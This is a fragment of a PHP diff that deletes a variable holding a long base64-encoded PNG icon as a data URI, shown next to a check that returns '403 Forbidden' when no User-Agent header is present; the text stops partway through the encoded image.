@@ -12,8 +12,6 @@ if (!isset($_SERVER['HTTP_USER_AGENT'])) {
     die('<h1>403 Forbidden</h1>');
 }
 
-$imageIco = "data:image/jpeg;base64,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